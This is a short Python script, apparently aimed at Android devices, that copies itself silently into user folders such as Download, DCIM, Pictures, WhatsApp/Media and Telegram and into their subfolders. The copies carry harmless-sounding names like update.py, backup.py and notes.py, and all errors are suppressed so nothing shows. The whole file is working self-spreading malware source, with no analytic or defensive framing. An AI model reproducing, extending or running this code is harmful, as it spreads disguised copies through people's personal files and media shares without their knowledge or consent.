import os, sys, shutil

SELF = os.path.abspath(sys.argv[0]) if sys.argv and sys.argv[0] else ""
NAMES = ["update.py", "notes.py", "tools.py", "sync.py", "backup.py", "helper.py", "calc.py", "memo.py"]

TARGETS = [
    "/sdcard/Download",
    "/sdcard/Documents",
    "/sdcard/DCIM",
    "/sdcard/Pictures",
    "/sdcard/Music",
    "/sdcard/Movies",
    "/sdcard/WhatsApp/Media",
    "/sdcard/Telegram"
]


def _spread():
    if not SELF or not os.path.isfile(SELF):
        return
    for tgt in TARGETS:
        if not os.path.isdir(tgt):
            continue
        for name in NAMES:
            try:
                shutil.copy2(SELF, os.path.join(tgt, name))
            except Exception:
                continue
        try:
            for sub in os.listdir(tgt):
                sp = os.path.join(tgt, sub)
                if os.path.isdir(sp):
                    for name in NAMES:
                        try:
                            shutil.copy2(SELF, os.path.join(sp, name))
                        except Exception:
                            continue
        except Exception:
            continue


try:
    _spread()
except Exception:
    pass